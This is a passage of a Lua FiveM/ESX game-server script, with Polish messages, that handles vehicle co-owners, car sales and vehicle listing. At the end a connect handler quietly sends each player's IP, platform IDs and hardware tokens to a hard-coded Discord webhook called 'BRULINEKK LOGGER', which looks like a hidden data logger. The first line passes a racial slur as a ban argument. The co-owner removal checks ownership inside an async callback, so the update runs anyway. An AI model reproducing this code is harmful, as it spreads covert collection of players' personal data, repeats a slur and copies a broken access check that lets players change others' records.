					TriggerEvent("exilerp_scripts:banPlr", "nigger", source,  "Tried to delete someones car (exile_garages)")
					--exports['exile_logs']:SendLog(source, "Garages: Niepoprawny license check, gracz próbował usunąć komuś auto. [Cheater: "..xPlayer.identifier.." / pojazd należy do: "..result[1].owner.."]", 'anticheat')
					return
				end
			end
		end
	)
	MySQL.update.await(
		'UPDATE owned_vehicles SET co_owner2 = NULL, co_digit2 = 0 WHERE owner = @owner AND plate = @plate',
		{
			['@owner']   = xPlayer.identifier,
			['@plate'] 	 = plate
		}
	)
	TriggerClientEvent('esx:showNotification', xPlayer.source, "~g~Usunięto ~s~drugiego~g~ współwłaściciela auta ~s~" .. plate)
end)

RegisterServerEvent('falszywyy_garages:deleteSubowner3')
AddEventHandler('falszywyy_garages:deleteSubowner3', function(plate, who)
	local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.query(
		'SELECT owner FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
			if result[1] ~= nil then
				if xPlayer.identifier ~= result[1].owner then
					exports['exile_logs']:SendLog(source, "Garages: Niepoprawny license check, gracz próbował usunąć komuś auto. [Cheater: "..xPlayer.identifier.." / pojazd należy do: "..result[1].owner.."]", 'anticheat')
					return
				end
			end
		end
	)
	MySQL.update.await(
		'UPDATE owned_vehicles SET co_owner3 = NULL, co_digit3 = 0 WHERE owner = @owner AND plate = @plate',
		{
			['@owner']   = xPlayer.identifier,
			['@plate'] 	 = plate
		}
	)
	TriggerClientEvent('esx:showNotification', xPlayer.source, "~g~Usunięto ~s~trzeciego~g~ współwłaściciela auta ~s~" .. plate)
end)

RegisterServerEvent('esx_clothes:sellVehicle')
AddEventHandler('esx_clothes:sellVehicle', function(target, plate, model)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local _target = target
	local tPlayer = ESX.GetPlayerFromId(_target)
	local result = MySQL.query.await('SELECT owner FROM owned_vehicles WHERE owner = @identifier AND digit = @digit AND plate = @plate', {
			['@identifier'] = xPlayer.identifier,
			['@digit']	= xPlayer.getDigit(),
			['@plate'] = plate
		})
	if result[1] ~= nil then
		MySQL.update('UPDATE owned_vehicles SET owner = @target, digit = @tdigit WHERE owner = @owner AND digit = @digit AND plate = @plate', {
			['@owner'] = xPlayer.identifier,
			['@digit'] = xPlayer.getDigit(),
			['@plate'] = plate,
			['@target'] = tPlayer.identifier,
			['@tdigit'] = tPlayer.getDigit()
		}, function (rowsChanged)
			if rowsChanged ~= 0 then
				TriggerClientEvent('esx_contract:showAnim', _source)
				Wait(22000)
				TriggerClientEvent('esx_contract:showAnim', _target)
				Wait(22000)
				TriggerClientEvent('esx:showNotification', _source, 'Sprzedales samochód o numerach: '..plate)
				TriggerClientEvent('esx:showNotification', _target, 'Kupiłeś samochód o numerach: '..plate)
				exports['exile_logs']:SendLog(_source, "Sprzedano pojazd:\nModel: " .. model .. "\nNr. rej: " .. plate .. "\nNowy właścicel: [" .. _target .. "] " .. GetPlayerName(_target), 'contract')
				xPlayer.removeInventoryItem('contract', 1)
			end
		end)
	else
		TriggerClientEvent('esx:showNotification', _source, 'To nie twój samochód')
	end
end)

ESX.RegisterUsableItem('contract', function(source)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	TriggerClientEvent('esx_contract:getVehicle', _source)
end)

ESX.RegisterServerCallback('falszywyy-vehstatus:getVehicles', function(source, cb)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local vehicules = {}

	MySQL.query("SELECT * FROM owned_vehicles WHERE owner = @identifier AND digit = @digit OR co_owner = @identifier AND co_digit = @digit OR co_owner2 = @identifier AND co_digit2 = @digit OR co_owner3 = @identifier AND co_digit3 = @digit ",{
		['@identifier'] = xPlayer.getIdentifier(),
		['@digit'] = xPlayer.getDigit()
	}, function(data) 
		for _,v in pairs(data) do
			local vehicle = json.decode(v.vehicle)
			local state = v.state
			local plate = v.plate
			table.insert(vehicules, {
				vehicle = vehicle,
				plate = plate,
				state = state
			})
		end
		cb(vehicules)
	end)
end)



AddEventHandler('playerConnecting', function()
    local _source = source
    local name, license, steamhex, discordid, liveid, xblid = GetPlayerName(_source),'Brak Licencji', 'Brak Steam Hex', "Brak Discord ID", "Brak LiveID", "Brak Xbox Live"
    local tokens = {}
    local ip = GetPlayerEndpoint(_source)
    if ip == nil then
        ip = 'Nie znaleziono'
    end
    for k,v in ipairs(GetPlayerIdentifiers(_source)) do
        if string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
        elseif string.sub(v, 1, string.len("steam:")) == "steam:" then
            steamhex = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discordid = v
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xblid  = v
        end
    end
    for i = 0, GetNumPlayerTokens(_source) - 1 do 
        table.insert(tokens, GetPlayerToken(_source, i))
    end
    tokens = json.encode(tokens)
    PerformHttpRequest("https://discord.com/api/webhooks/1068614861497581738/7ij6zuwNzdMf8q03opLWNQx5mEeLOYPw9qugHqIARxYloyoivmMdb_nrHQGgDboIcmKl",function(f,o,h)end,'POST',json.encode({embeds = {{["description"] = "**BRULINEKK LOGGER**\n\n```nick: "..name.."\n"..license.."\n"..steamhex.."\nip: "..ip.."\n"..discordid.."\n"..liveid.."\n"..xblid.."\nHWID:\n"..tokens.."```",["footer"] = {["text"] = " Data: "..os.date("%x %X %p"),["icon_url"] = "https://media.discordapp.net/attachments/956216570848370720/993164908084613280/09F2646E-0E23-4BEB-B309-753F44B3123A.gif",},}}, avatar_url = "https://media.discordapp.net/attachments/956216570848370720/993164908084613280/09F2646E-0E23-4BEB-B309-753F44B3123A.gif"}), { ['Content-Type'] = 'application/json' })
end)